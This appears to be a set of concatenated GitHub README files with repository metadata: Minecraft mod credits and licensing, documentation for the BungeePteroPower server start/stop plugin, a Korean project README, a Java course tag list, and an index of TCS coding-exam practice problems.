<strong> Azanor </strong>  - Thaumcraft 4.2.2 API was used as a library under the MIT License to add Thaumcraft aspects to mod content.
<br><br>

<strong> WildBamaBoy </strong> - The horse achievement icon textures were directly based of the Cooconed Horse item texture from the Spider Queen mod. This asset was used under the Public Domain license through the condition of section 8 of the MCA Minecraft Mod License v1.1.1 (""In the event that no public declaration of the mod’s end-of-life is made within 1 year after the previous update, announcement regarding status, or official statement from an author, the mod is released into the public domain.""). Additionally, all the skins for the Minecraft Comes Alive Witchery werewolf villager forms were sourced from the Minecraft Comes Alive mod, the use of these assets are satisfied through the application of the ""GNU General Public License v3.0 and Further Conditions"" custom license which satisfies the GNU General Public License Version 3 of the Minecraft Comes Alive mod.
<br><br>
 
<strong> ganymedes01 </strong> - Code for proper damaging and item dropping for kitty litter box, kitty bed, and fish bowl was sourced from EntityArmourStand.class from the etfuturum mod. This asset was used under the Public Domain license.
<br><br>

<strong> Thornack </strong> - Provided the code for replacing the Witchery player wolf and player werewolf models with the Mo Creatures dire wolf and werewolf models (https://forums.minecraftforge.net/topic/28566-1710-how-to-change-player-model-and-texture/).
<br><br>
 
<strong> TheAetherTeam </strong> - The AchievementsAether.class and Aether.class code from the 1.7.10 Aether Mod helped me understand how to add an achievements class that is separate to the main mod class file. This asset was used under the GNU Lesser General Public License v3.0 through the custom license condition of The Aether mod ""The source code of The Aether mod for Minecraft 1.7+ is under the LGPL v3.0 license"".TheAetherTeam - The AchievementsAether.class and Aether.class code from the 1.7.10 Aether Mod helped me understand how to add an achievements class that is separate to the main mod class file. This asset was used under the GNU Lesser General Public License v3.0 through the custom license condition of The Aether mod ""The source code of The Aether mod for Minecraft 1.7+ is under the LGPL v3.0 license"".The different custom license of this project is permitted under the GNU Lesser General Public License v3.0 from the following sections:

	GNU Lesser General Public License v3.0 - Section 0:
		   ""...""The Library"" refers to a covered work governed by this License"",
		   ""A “Combined Work” is a work produced by combining or linking an Application with the Library""

	GNU Lesser General Public License v3.0 - Section 4:
		""You may convey a Combined Work under terms of your choice"" provided that:
			- Private modifications are allowed.
 		     	- Notice is given that the Library is used
		      	- A copy of the GNU Lesser Public License is provided along with a copy of the GNU General Public License.
 		     	- Access is provided to the source code of the Library.


A copy of the GNU Lesser General Public License (1.7.10 Aether Source Code License) can be found in the ""Negligable Licenses"" folder inside the assets folder of the mod jar archive. 

A copy of the GNU General Public license can be found inside the assets folder of the mod jar archive.

The source code for the 1.7.10 Aether mod can be found here: https://github.com/The-Aether-Team/The-Aether-Archived/tree/1.7.10
 
<br><br><br>  
 
 <h3> Sounds Files: </h3>
 
 <strong> Mike Koenig </strong> - Kitty using Litter box sound was sourced from: https://soundbible.com/313-Dig-In-A-Cat-Litter-Box.html. This was used under the CC BY 3.0 DEED Attribution 3.0 Unported license. A different license for this project as a whole is acceptable under section 4a ""this does not require the Collection apart from the Work itself to be made subject to the terms of this License"".
 
 <strong> Fesliyan Studios </strong> - Rattle Snake Rattle sound effects were sourced from https://www.fesliyanstudios.com/royalty-free-sound-effects-download/rattlesnake-281 This was used under the Fesliyan Studios Sound Effects Policy license (see ""Negligable Licenses"" folder inside the assets folder of the mod jar archive ).
 
  
 
The following assets were used under the Unlicense license:
 
 Panda Cub Grunt:
 
 - https://quicksounds.com/sound/2742/panda-bear-bark-1
 - https://quicksounds.com/sound/2743/panda-bear-bark-2
 
 
 Panda Cub Hurt & Death: https://www.youtube.com/watch?v=YRmGZIENeq4&ab_channel=audiofreeHD 
 
 Panda Cub Hurt: https://www.youtube.com/watch?v=AyY70jPsZcc&ab_channel=nosoundeffects
 
 
 Panda Adult Grunt: https://www.youtube.com/watch?v=4TANecQTYPY&ab_channel=SFX-SoundEffectsForContentCreators
 
 
 Panda Adult Hurt and Death: https://www.youtube.com/watch?v=i5Y_8s6qDdk&ab_channel=FreeSoundEffect


<br><br><br>

 <h3> Language File Translations: </h3>
	Omgise - Chinese (Simplified) (zh_CN.lang)
	<br><br>
 	Hudhand - Russian (ru_RU.lang)
  
<br><br><br>

<h3> Beta Testers Who Helped Solve Major Bugs: </h3>
	Omgise
 	<br><br>
	quentin452
 	<br><br>
	brandyyn
 	<br><br>
	yoruki_167
  
<br><br><br>
 
 ===========================================================================
  <h3> Original Mo'Creatures Contributor Credits </h3>
 
 
 - Kent C Jensen (BlockDaddy) for his amazing Ogres and fish textures. And for his incredible help with ostriches and fish bowls. He is the main force behind the horse overhaul and did all of the textures and art, as well as many of the ideas for the new horses. He has also been helping with the remodelling and retexturing. Most models and textures on this mod have been done by Kent.
 - blood (Bloodshot    AKA     bloodmc)  for his invaluable help with updating to 1.8.1 and Mo'Creatures SMP, and maintaning the SMP code on MoCreatures 4.2.0
 - ScottKillen for his help with the Extrabiomes XL
 - AtomicStryker for the SMP port for Minecraft 1.2.5
 - Cojomax for his help with adding the sounds without audiomod
 - Freakstricth for his help with the Forge sprites.
 - Resuke for his sprites
 - Vaprtek, for his awesome Horse Model.
 - Dorino1 quack sounds plus painterly pack's duck texture.
 - Macaque for his boar textures.
 - KodaichiZero for his Bunnies!
 - Rondaround: fox idea, AI, sounds and texture
 - _303 and Risugami for their help with ModLoader and AudioMod
 - Corosus for pointing some optimization changes in the code
 - charle88 for shark's model inspiration
 - cdrumer11 for his help with the pink and white dolphin skins

 ===========================================================================

<br><br><br>

## Use of anatawa12's Fork of ForgeGradle 1.2 within Project:
The source code of this project uses anatawa12's fork of ForgeGradle 1.2 as a library under the GNU Lesser General Public License v2.1 (https://choosealicense.com/licenses/lgpl-2.1/).
 

Compiled versions of this mod are permitted under section 5 of the original license, ""A program that contains no derivative of any portion of the Library, but is designed to work with the Library by being compiled or linked with it, is called a ""work that uses the Library"". Such a work...is not a derivative work of the Library""; consequently the conditions of the original license do not apply to the work.


The source code of this mod is permitted under section 6 of the original license, ""you may also combine or link a ""work that uses the Library"" with the Library to produce a work containing portions of the Library, and distribute that work under terms of your choice"" provided that:
* Private modifications are allowed.
* Notice is given that the Library is used and a copy of it's original license is provided.
* Access is provided to the source code of the Library.


The source code for anatawa12's fork of ForgeGradle 1.2 can be found here: https://github.com/anatawa12/ForgeGradle-1.2

</details>
",0,2,1,NOASSERTION
Kamesuta/BungeePteroPower,main,"# BungeePteroPower
![LogoArt](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/e8914f79-806b-436c-a0e6-e4eaf8ad5eca)  
[![License: MIT](https://img.shields.io/github/license/Kamesuta/BungeePteroPower?label=License)](LICENSE)
[![Spigotmc Version](https://img.shields.io/spiget/version/114883?logo=spigotmc&label=Spigotmc%20Version)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![JitPack](https://img.shields.io/jitpack/version/com.github.Kamesuta/BungeePteroPower?logo=jitpack&label=JitPack)](https://jitpack.io/#Kamesuta/BungeePteroPower)  
[![Spigotmc Downloads](https://img.shields.io/spiget/downloads/114883?logo=spigotmc&label=Spigotmc%20Downloads)](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/)
[![bStats Servers](https://img.shields.io/bstats/servers/20917?label=bStats%20Servers)](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917)  

BungeePteroPower is a plugin that can automatically start/stop servers based on the number of players.  
It can start and stop servers on the [Pterodactyl panel](https://pterodactyl.io/) when players join or leave the Bungeecord proxy server.  
This helps to save server resources and manage servers more efficiently.  

https://github.com/Kamesuta/BungeePteroPower/assets/16362824/019fdfc5-f0fc-4532-89f3-3342b5812593

## Key Features

- Automatically stops servers using Pterodactyl's API when there are no players on the server for a certain period of time.
    - The time until shutdown can be configured for each server.
- Automatically starts servers using Pterodactyl's API when players join the server.
- Permissions settings allow for specifying players who can manually start servers and players for whom automatic startup is enabled upon joining.
- You can reset the server from a backup when it shuts down.
    - This is useful when creating mini-game servers that reset once played.

![Overview](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d)

## Download

- You can download it from [Spigot](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/) or [GitHub Releases](https://github.com/Kamesuta/BungeePteroPower/releases).

## Requirements

- Java 11 or higher
    - uses `java.net.http.HttpClient` in Java 11 for REST API communication with Pterodactyl.

## Getting Started

1. Obtain an API key in the Pterodactyl panel.
    - The client API key for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
2. Add the plugin to the BungeeCord server and start it.
3. Configure the [Required Settings](#required-settings) in the generated `plugins/BungeePteroPower/config.yml` file.
    ```yml
    # Pterodactyl configuration
    pterodactyl:
      # The URL of your pterodactyl panel
      # If you use Cloudflare Tunnel, you need to allow the ip in the bypass setting.
      url: ""https://panel.example.com""
      # The client api key of your pterodactyl panel. It starts with ""ptlc_"".
      # You can find the client api key in the ""API Credentials"" tab of the ""Account"" page.
      apiKey: ""ptlc_000000000000000000000000000000000000000000""
    
    # Per server configuration
    servers:
      pvp:
        # Pterodactyl server ID
        # You can find the Pterodactyl server ID in the URL of the server page.
        # For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.
        id: 1234abcd
        # The time in seconds to stop the server after the last player leaves.
        # If you don't want to stop the server automatically, set it to -1.
        # If you set it to 0, the server will be stopped immediately after the last player leaves.
        timeout: 30
    ```
4. Reload the config with the `/ptero reload` command.
5. Configure the [Permission Settings](#permission-settings).  
    (You **MUST** configure permission to use this plugin, otherwise the player will not be able to do anything!)  
    You can use either of the following methods.  
    - Use a permission plugin like [LuckPerms](https://luckperms.net/).
        1. For LuckPerms, use the following commands to set permissions:
            ```
            # The player can start all servers
            /lp user <player_name> permission set ptero.autostart.*
            # The player can start specific server
            /lp user <player_name> permission set ptero.autostart.<server_name>
            # All players can start all servers
            /lp group default permission set ptero.autostart.*
            ```
            ※ `<player_name>` refers to the player's name, `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
    - Use built-in permission settings.
        1. Open `config.yml`.
        2. Add the following settings to the `config.yml` file.
            ```yml
            permissions:
                default:
                # All players can start all server
                - ptero.autostart.*
                # All players can start specific server
                - ptero.autostart.<server_name>
            ```  
            ※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
        3. Restart the BungeeCord server.
  
## Usage

### Automatic Startup

- Servers will automatically start when players attempt to join each server on BungeeCord.
    - This feature is available only to players with the `ptero.autostart.<server_name>` permission.

### Manual Start/Stop

- Use the `/ptero start <server_name>` command to manually start a server.
    - This command is available only to players with the `ptero.start.<server_name>` permission.
- Use the `/ptero stop <server_name>` command to manually stop a server.
    - This command is available only to players with the `ptero.stop.<server_name>` permission.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.

### Reloading config.yml/Language files

- Use `/ptero reload` to reload the config.yml and language files.

## Configuration

The `config.yml` file includes the following settings, but not all items need to be configured.

### Required Settings

- `pterodactyl`: Configure settings for Pterodactyl, including URL and API key.
    - `url`: Set the URL of your Pterodactyl panel. (Example: https://panel.example.com/)
        - If you are using services like Cloudflare Tunnel, ensure proper bypass settings for IP-based communication.
    - `apiKey`: Set the client API key for Pterodactyl.
        - It begins with `ptlc_`.
        - Client API keys for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `id`: Set the server ID on Pterodactyl.
        - Server IDs on Pterodactyl can be found in the URL of the server page.
        - For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.

### Optional Settings

- `version`: Set the version of the plugin.
    - When updating the plugin, a warning will be displayed if this value does not match the plugin version.
    - A `config.new.yml` file will be generated, and manual migration of settings using a merge tool is required.
    - After migration, please change this value to the new version.
- `checkUpdate`: Set whether to check for plugin updates. The default is `true`.
- `language`: Set the language to be used. The default is English (`en`).
    - Refer to the comments in the [config file](./src/main/resources/config.yml) for supported languages.
- `startTimeout`: After starting a server with this plugin, it will stop the server if there are no players for a certain period. The unit is seconds.
    - After starting, the server will stop after the `startTimeout` plus the server's timeout duration.
    - Setting it to 1 keeps the server running until players join and leave.
- `powerControllerType`: Set the type of power controller to be used.
    - The built-in PowerController currently supports only `pterodactyl`, which operates Pterodactyl.
    - By adding add-ons, you can add your own custom PowerController.
      Certainly! Here's the English translation of the provided description:
- `useSynchronousPing`: This setting determines whether to perform **synchronous** pinging to the server during login. (Experimental feature)
    - When enabled, pinging the server during login will happen synchronously rather than asynchronously.
    - This allows displaying BungeePteroPower messages (`join_autostart_login` in messages.yml) instead of the ""Could not connect to a default or fallback server"" message upon login.
    - The default value is `false`. Enabling this can be useful if you want to set servers (such as lobby servers) to a suspended state in BungeePteroPower immediately after login.
- `startupJoin`: After server startup, it is used to automatically join players to the server and check the server's status.
    - `timeout`: Set the maximum waiting time for players to join after server startup.
        - Set this value to the maximum time it takes for the server to start.
        - Setting it to 0 disables this feature, and players will not automatically join after startup.
    - `joinDelay`: Once the server is pingable, wait the specified amount of seconds before sending the player to the server
        - This is useful to wait for plugins like Luckperms to fully load
        - If you set it to 0, the player will be connected as soon as the server is pingable
    - `pingInterval`: Set the interval for checking the server's status.
- `restoreOnStop`: Configure settings for the feature to reset the server from a backup when it is stopped.
    - `timeout`: Set the maximum waiting time after sending the stop signal for the server to stop. (The restore will be performed after the server stops)
    - `pingInterval`: Set the interval for checking if the server is offline after sending the stop signal.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `timeout`: When there are no players on the server, it will stop after a certain period. The unit is seconds.
    - `backupId`: The UUID of the backup to restore when the server stops.
        - If this setting is empty or removed, no restore from backup will be performed when the server stops.
        - Useful for servers that need to be reset after each game.

### Permission Settings

BungeePteroPower plugin allows fine-grained control over commands available to players for each server using permissions.

- `ptero.autostart.<server_name>`: Servers will automatically start when players join each server on BungeeCord for players with this permission.
- `ptero.start.<server_name>`: Allows the `/ptero start <server_name>` command to manually start a server.
    - If a player doesn't have `ptero.autostart.<server_name>` permission but has this permission, they will see a manual start button when they join the server.
- `ptero.stop.<server_name>`: Allows the `/ptero stop <server_name>` command to manually stop a server.
- `ptero.reload`: Allows the `/ptero reload` command to reload the config.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
※ Specify `*` for `<server_name>` to apply permissions to all servers.

### About Language Files

- You can set the language in config.yml using the language option.
    - Please refer to the comments in the config file for the supported languages.
- Upon startup, a file for the language set in config.yml will be generated.
    - This file allows you to define only the messages you want to change.
    - Messages that are not defined will be loaded from the language file set within the plugin.
- You can edit and then reload the plugin's language by using the `/ptero reload` command.
- Contributions via Pull Requests for additional language files are welcome.

## Information for Plugin Developers

### About Power Controllers

BungeePteroPower provides a Power Controller API for supporting platforms other than Pterodactyl.  
By creating add-ons, you can add power controllers for platforms other than Pterodactyl!

We also welcome pull requests for adding built-in power controllers!  
Ideally, we would like to support the following:
- Power controllers that can start servers locally
- Power controllers compatible with management software other than Pterodactyl.  
    For example, we would like to support the following:
    - PufferPanel
    - Minecraft Server Manager
    - MCSManager
    - MC Server Soft
    - AMP

### Creating Add-ons

- BungeePteroPower provides an API for integration with other plugins.
    - If you want to support platforms other than Pterodactyl, it is possible by implementing the API.
- You can use the BungeePteroPower API by adding dependencies.
    1. Add the JitPack repository inside the pom.xml of your add-on:
        ```xml
        <repositories>
            <repository>
                <id>jitpack.io</id>
                <url>https://jitpack.io</url>
            </repository>
        </repositories>
        ```
    2. Add BungeePteroPower as a dependency:
        ```xml
        <dependency>
            <groupId>com.github.Kamesuta</groupId>
            <artifactId>BungeePteroPower</artifactId>
            <version>version</version>
        </dependency>
        ```
    3. Add the dependency to your plugin.yml:
        ```yml
        depends:
          - BungeePteroPower
        ```
    4. Use the API:
        ```java
        import com.kamesuta.bungeepteropower.api.BungeePteroPowerAPI;

        public class YourPlugin extends JavaPlugin {
            @Override
            public void onEnable() {
                // Get an instance of BungeePteroPowerAPI
                BungeePteroPowerAPI api = BungeePteroPowerAPI.getInstance();
                // Register your custom PowerController
                api.registerPowerController(""your_service"", new YourPowerController());
            }
        }
        ```
        For an example implementation of a PowerController for Pterodactyl, please refer to [PterodactylController.java](./src/main/java/com/kamesuta/bungeepteropower/power/PterodactylController.java).
- If you want your PowerController to be added to BungeePteroPower, please send a pull request.

### Building

Pull requests are welcome for BungeePteroPower.  
You can build it using the following steps:

```bash
git clone https://github.com/Kamesuta/BungeePteroPower.git
cd BungeePteroPower
mvn install
```
- This plugin needs to be built with Java 11 or higher.
- After building, a `BungeePteroPower-<version>.jar` file will be generated in the `target` directory.

## About Statistics Data

BungeePteroPower collects anonymous statistical data using [bStats](https://bstats.org/).  
You can find the statistics data [here](https://bstats.org/plugin/bungeecord/BungeePteroPower/20917).

bStats is used to understand the usage of the plugin and help improve it.  
To disable the collection of statistical data, please set `enabled` to `false` in `plugins/bStats/config.yml`
",9,2,3,MIT
spon-us/SponUs-BE,develop,"# Spon-us | 기업과 학생의 만남

![sponus](https://github.com/spon-us/SponUs-BE/assets/121790935/3e0b7908-187a-486a-9802-f85d79864112)
Spon-us(스포너스)는 대학생 단체와 기업 간의 협찬, 제휴, 그리고 연계 프로그램을 원활히 이끌어가는 서비스입니다.

### 📎 [API 명세서 v1](https://spon-us.notion.site/API-f9abab1bc7f448d4bcc010cfb935c5f9?pvs=4)

### 📎 API 명세서 v2 (개발중)

<br>

## ✨ 팀원

|                         앤디/이유제                         |                            마루/김대휘                            |                         소피/이소정                         |                          세헌/호세헌                          |                        태태/권정태                        |
|:------------------------------------------------------:|:------------------------------------------------------------:|:------------------------------------------------------:|:--------------------------------------------------------:|:----------------------------------------------------:|
|  <img src=""https://github.com/dbwp031.png?size=100"">   |    <img src=""https://github.com/kimday0326.png?size=100"">    |  <img src=""https://github.com/xxoznge.png?size=100"">   |   <img src=""https://github.com/seheonnn.png?size=100"">   | <img src=""https://github.com/oxdjww.png?size=100"">:  |
|            Part Lead<br/>Backend Developer             |                      Backend Developer                       |                   Backend Developer                    |                    Backend Developer                     |                  Backend Developer                   |
| <center>[dbwp031](https://github.com/dbwp031)</center> | <center>[kimday0326](https://github.com/kimday0326)</center> | <center>[xxoznge](https://github.com/xxoznge)</center> | <center>[seheonnn](https://github.com/seheonnn)</center> | <center>[oxdjww](https://github.com/oxdjww)</center> |

## 📆 프로젝트 기간

- 1차 개발(MVP): **2024.01.05 ~ 2024.02.19**
- 2차 개발(리빌딩): **2024.05 ~ ing**

<br>

## 🛠️ 기술 스택

### 개발 환경

<p>
<img src=""https://img.shields.io/badge/JAVA 17-007396?style=for-the-badge&logo=java&logoColor=white"">
<img src=""https://img.shields.io/badge/Spring-6DB33F?style=for-the-badge&logo=Spring&logoColor=white"">
<img src=""https://img.shields.io/badge/Spring Boot 3-6DB33F?style=for-the-badge&logo=Spring boot&logoColor=white"">
<img src=""https://img.shields.io/badge/Spring Security 6-6DB33F?style=for-the-badge&logo=Spring Security&logoColor=white"">
<img src=""https://img.shields.io/badge/Spring Data JPA-6DB33F?style=for-the-badge&logo=Spring&logoColor=white"">
<img src=""https://img.shields.io/badge/QueryDsl-3B66BC?style=for-the-badge&logo=QueryDsl&logoColor=white"">
</p>

<p>
<img src=""https://img.shields.io/badge/MySql-00758F?style=for-the-badge&logo=MySql&logoColor=white"">
<img src=""https://img.shields.io/badge/Redis-DC382D?style=for-the-badge&logo=redis&logoColor=white"">
</p>

<p>
<img src=""https://img.shields.io/badge/Gradle-02303A?style=for-the-badge&logo=gradle&logoColor=white"">
<img src=""https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white"">
<img src=""https://img.shields.io/badge/EC2-FF9900?style=for-the-badge&logo=AMAZON EC2&logoColor=white"">
<img src=""https://img.shields.io/badge/RDS-527FFF?style=for-the-badge&logo=AMAZON RDS&logoColor=white"">
<img src=""https://img.shields.io/badge/S3-569A31?style=for-the-badge&logo=AMAZON S3&logoColor=white"">
</p>

### 협업 도구

<p>
<img src=""https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=Git&logoColor=white"">
<img src=""https://img.shields.io/badge/Github-000000?style=for-the-badge&logo=github&logoColor=white"">
<img src=""https://img.shields.io/badge/Slack-4A154B?style=for-the-badge&logo=slack&logoColor=white"">
<img src=""https://img.shields.io/badge/Notion-000000?style=for-the-badge&logo=notion&logoColor=white"">
<img src=""https://img.shields.io/badge/Swagger-85EA2D?style=for-the-badge&logo=swagger&logoColor=white"">
<img src=""https://img.shields.io/badge/Discord-5865FE?style=for-the-badge&logo=discord&logoColor=white"">
</p>

<br>

## 🏗️ 아키텍처

<img width=""1646"" alt=""arch"" src=""https://github.com/user-attachments/assets/b8663103-4bcf-4e44-bb22-9c33ef464fa9"">


<br>

## 📢 커밋 컨벤션

| 태그이름       | 내용                                          |
|------------|---------------------------------------------|
| `feat`     | 새로운 기능을 추가할 경우                              |
| `fix `     | 버그를 고친 경우                                   |
| `!hotfix`  | 급하게 치명적인 버그를 고쳐야하는 경우                       |
| `style`    | 코드 포맷 변경, 세미 콜론 누락, 코드 수정이 없는 경우            |
| `refactor` | 코드 리팩토링                                     |
| `comment`  | 필요한 주석 추가 및 변경                              |
| `docs`	    | 문서, Swagger 를 수정한 경우                        |
| `test`     | 테스트 추가, 테스트 리팩토링(프로덕션 코드 변경 X)              |
| `chore`	   | 빌드 태스트 업데이트, 패키지 매니저를 설정하는 경우(프로덕션 코드 변경 X) |
| `rename`   | 파일 혹은 폴더명을 수정하거나 옮기는 작업만인 경우                |
| `remove`   | 파일을 삭제하는 작업만 수행한 경우                         |
| `ci`       | 배포 방식 수정 및 새로 추가 / 기존 배포 스크립트 수정            |
",1,3,3,
oguzkaran/JavaApp2-Jan-2024,main,"# JavaApp2-Jan-2024
KAYNAK GÖSTERMEK KOŞULUYLA HER TÜRLÜ ALINTI YAPILABİLİR

#java
#programming
#eclipse 
#intellij
#spring
#springboot
#stream
#parallelstream
#collections
#jpa
#hibernate
#mapstruct
#retrofit
#resttemplate
#postgresql
#rxjava
#crudrepository
#tcp
#socket
#iot
#websocket
#udp
#datastructures
#algorithms
#recursion
#docker
#mongodb
#nosql
#cryptography
#garbacecollector

",0,0,1,
karthikreddy-7/TCS-NQT-CODING-SHEET,main,"# TCS-NQT-CODING-SHEET
Contains all the previously asked and practice coding questions by TCS in Java Programming Language

## Table of Contents
- [Previously asked coding Question](#previously-asked-coding-question)
- [Problems on Arrays](#problems-on-arrays)
- [Problems on Numbers](#problems-on-numbers)
- [Problems on Number System](#problems-on-number-system)
- [Problems on Sorting](#problems-on-sorting)
- [Problems on String](#problems-on-string)


## Problems on Arrays
Contains coding problems related to Array manipulation.

#### 1. Find the smallest number in an array [Click here to see solution](Problems_on_Arrays/SmallInArray.java)

#### 2. Find the largest number in an array [Click here to see solution](Problems_on_Arrays/LargeInArray.java)

#### 3. Second Smallest and Second Largest element in an array [Click here to see solution](Problems_on_Arrays/SecondLargeAndSmall.java)

#### 4. Reverse a given array [Click here to see solution](Problems_on_Arrays/ReverseArray.java)

#### 5. Count frequency of each element in an array [Click here to see solution](Problems_on_Arrays/FrequencyArray.java)

#### 6. Rearrange array in increasing-decreasing order [Click here to see solution](Problems_on_Arrays/RearrangeArray.java)

#### 7. Calculate sum of the elements of the array [Click here to see solution](Problems_on_Arrays/SumOfArray.java)

#### 8. Rotate array by K elements – Block Swap Algorithm [Click here to see solution](Problems_on_Arrays/RotateArray.java)

#### 9. Average of all elements in an array [Click here to see solution](Problems_on_Arrays/AverageOfArray.java)

#### 10. Find the median of the given array [Click here to see solution](Problems_on_Arrays/MedianOfArray.java)

#### 11. Remove duplicates from a sorted array [Click here to see solution](Problems_on_Arrays/RemoveDuplicatesSorted.java)

#### 12. Remove duplicates from an unsorted array [Click here to see solution](Problems_on_Arrays/RemoveDuplicatesUnsorted.java)

#### 13. Adding Element in an array [Click here to see solution](Problems_on_Arrays/AddElementToArray.java)

#### 14. Find all repeating elements in an array [Click here to see solution](Problems_on_Arrays/FindRepeatingElements.java)

#### 15. Find all non-repeating elements in an array [Click here to see solution](Problems_on_Arrays/FindNonRepeatingElements.java)

#### 16. Find all symmetric pairs in array [Click here to see solution](Problems_on_Arrays/SymmetricPairs.java)

#### 17. Maximum product subarray in an array [Click here to see solution](Problems_on_Arrays/MaximumProductSubarray.java)

#### 18. Replace each element of the array by its rank in the array [Click here to see solution](Problems_on_Arrays/ReplaceElementsByRank.java)

#### 19. Sorting elements of an array by frequency [Click here to see solution](Problems_on_Arrays/SortByFrequency.java)

#### 20. Rotation of elements of array- left and right [Click here to see solution](Problems_on_Arrays/RotationLeftRight.java)

#### 21. Finding equilibrium index of an array [Click here to see solution](Problems_on_Arrays/EquilibriumIndex.java)

#### 22. Finding Circular rotation of an array by K positions [Click here to see solution](Problems_on_Arrays/CircularRotation.java)

#### 23. Sort an array according to the order defined by another array [Click here to see solution](Problems_on_Arrays/SortByDefinedOrder.java)

#### 24. Search an element in an array [Click here to see solution](Problems_on_Arrays/SearchElement.java)

#### 25. Check if Array is a subset of another array or not [Click here to see solution](Problems_on_Arrays/ArraySubsetCheck.java)



## Problems on Numbers
Contains coding problems related to number manipulation.

#### 1. Check if a number is palindrome or not [Click here to see solution](Problems_On_Number/PalindromeCheck.java)

#### 2. Find all Palindrome numbers in a given range [Click here to see solution](Problems_On_Number/PalindromeNumbersInRange.java)

#### 3. Check if a number is prime or not [Click here to see solution](Problems_On_Number/PrimeCheck.java)

#### 4. Prime numbers in a given range [Click here to see solution](Problems_On_Number/PrimeNumbersInRange.java)

#### 5. Check if a number is armstrong number or not [Click here to see solution](Problems_On_Number/ArmstrongCheck.java)

#### 6. Check if a number is perfect number [Click here to see solution](Problems_On_Number/PerfectNumberCheck.java)

#### 7. Even or Odd [Click here to see solution](Problems_On_Number/EvenOddCheck.java)

#### 8. Check whether a given number is positive or negative [Click here to see solution](Problems_On_Number/PositiveNegativeCheck.java)

#### 9. Sum of first N natural numbers [Click here to see solution](Problems_On_Number/SumOfNaturalNumbers.java)

#### 10. Find Sum of AP Series [Click here to see solution](Problems_On_Number/SumOfAPSeries.java)

#### 11. Program to find sum of GP Series [Click here to see solution](Problems_On_Number/SumOfGPSeries.java)

#### 12. Greatest of two numbers [Click here to see solution](Problems_On_Number/GreatestOfTwo.java)

#### 13. Greatest of three numbers [Click here to see solution](Problems_On_Number/GreatestOfThree.java)

#### 14. Leap Year or not [Click here to see solution](Problems_On_Number/LeapYearCheck.java)

#### 15. Reverse digits of a number [Click here to see solution](Problems_On_Number/ReverseDigits.java)

#### 16. Maximum and Minimum digit in a number [Click here to see solution](Problems_On_Number/MaxMinDigitInNumber.java)

#### 17. Print Fibonacci up to Nth Term [Click here to see solution](Problems_On_Number/FibonacciSeries.java)

#### 18. Factorial of a number [Click here to see solution](Problems_On_Number/Factorial.java)

#### 19. Power of a number [Click here to see solution](Problems_On_Number/PowerOfNumber.java)

#### 20. Factors of a given number [Click here to see solution](Problems_On_Number/FactorsOfNumber.java)

#### 21. Print all prime factors of the given number [Click here to see solution](Problems_On_Number/PrimeFactors.java)

#### 22. Check if a number is a strong number or not [Click here to see solution](Problems_On_Number/StrongNumberCheck.java)

#### 23. Check if a Number is Automorphic [Click here to see solution](Problems_On_Number/AutomorphicCheck.java)

#### 24. GCD of two numbers [Click here to see solution](Problems_On_Number/GCD.java)

#### 25. LCM of two numbers [Click here to see solution](Problems_On_Number/LCM.java)

#### 26. Check if a number is Harshad number [Click here to see solution](Problems_On_Number/HarshadCheck.java)

#### 27. Check if the number is abundant number or not [Click here to see solution](Problems_On_Number/AbundantNumberCheck.java)

#### 28. Sum of digits of a number [Click here to see solution](Problems_On_Number/SumOfDigits.java)

#### 29. Sum of numbers in the given range [Click here to see solution](Problems_On_Number/SumInRange.java)

#### 30. Permutations in which N people can occupy R seats in a classroom [Click here to see solution](Problems_On_Number/Permutations.java)

#### 31. Program to add two fractions [Click here to see solution](Problems_On_Number/AddFractions.java)

#### 32. Replace all 0s with 1s in a given integer [Click here to see solution](Problems_On_Number/ReplaceZerosWithOnes.java)

#### 33. Can a number be expressed as a sum of two prime numbers [Click here to see solution](Problems_On_Number/SumOfTwoPrimes.java)

#### 34. Calculate the area of a circle [Click here to see solution](Problems_On_Number/AreaOfCircle.java)

#### 35. Program to find roots of a Quadratic Equation [Click here to see solution](Problems_On_Number/QuadraticEquationRoots.java)


## Problems on Number System
Contains coding problems related to number system manipulation.

#### 1. Convert Binary to Decimal [Click here to see solution](Problems_On_Number_System/BinaryToDecimal.java)

#### 2. Convert binary to octal [Click here to see solution](Problems_On_Number_System/BinaryToOctal.java)

#### 3. Decimal to Binary conversion [Click here to see solution](Problems_On_Number_System/DecimalToBinary.java)

#### 4. Convert decimal to octal [Click here to see solution](Problems_On_Number_System/DecimalToOctal.java)

#### 5. Convert octal to binary [Click here to see solution](Problems_On_Number_System/OctalToBinary.java)

#### 6. Convert octal to decimal [Click here to see solution](Problems_On_Number_System/OctalToDecimal.java)

#### 7. Convert digits/numbers to words [Click here to see solution](Problems_On_Number_System/NumberToWords.java)


## Problems on Sorting
Contains coding problems related to sorting algorithms.

#### 1. Bubble Sort Algorithm [Click here to see solution](Problems_On_Sorting/BubbleSort.java)

#### 2. Selection Sort Algorithm [Click here to see solution](Problems_On_Sorting/SelectionSort.java)

#### 3. Insertion Sort Algorithm [Click here to see solution](Problems_On_Sorting/InsertionSort.java)

#### 4. Quick Sort Algorithm [Click here to see solution](Problems_On_Sorting/QuickSort.java)

#### 5. Merge sort algorithm [Click here to see solution](Problems_On_Sorting/MergeSort.java)


## Problems on String
Contains coding problems related to string manipulation.

#### 1. Check if a given string is palindrome or not [Click here to see solution](Problems_On_String/PalindromeCheck.java)

